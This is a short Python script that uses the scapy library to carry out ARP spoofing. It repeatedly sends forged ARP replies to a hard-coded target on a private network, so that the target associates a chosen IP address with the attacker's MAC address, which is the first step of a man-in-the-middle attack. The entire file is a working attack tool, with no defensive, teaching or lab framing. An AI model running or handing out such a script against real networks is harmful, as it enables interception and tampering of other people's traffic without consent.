import time
from scapy.all import ARP, Ether, sendp, sniff, get_if_hwaddr

def arp_spoof(interface, target_ip, target_mac, spoofer_ip, spoofer_mac):
    # Get the interface's hardware address
    if_hwaddr = get_if_hwaddr(interface)
    
    # Create an ARP reply packet
    arp_reply = ARP(op=2, pdst=target_ip, psrc=spoofer_ip, hwdst=target_mac, hwsrc=spoofer_mac)
    
    try:
        while True:
            # Send the ARP reply packet
            sendp(Ether(dst=target_mac) / arp_reply, iface=interface)
            # Wait for 1 second before sending the next ARP reply
            time.sleep(1)
    except KeyboardInterrupt:
        print("ARP spoofing stopped.")

if __name__ == "__main__":
    # Define the interface to use
    interface = "eth0"
    # Define the target IP address
    target_ip = "192.168.1.100"
    # Define the target MAC address
    target_mac = "00:11:22:33:44:55"
    # Define the spoofer's IP address
    spoofer_ip = "192.168.1.101"
    # Define the spoofer's MAC address
    spoofer_mac = "00:11:22:33:44:56"
    
    arp_spoof(interface, target_ip, target_mac, spoofer_ip, spoofer_mac)
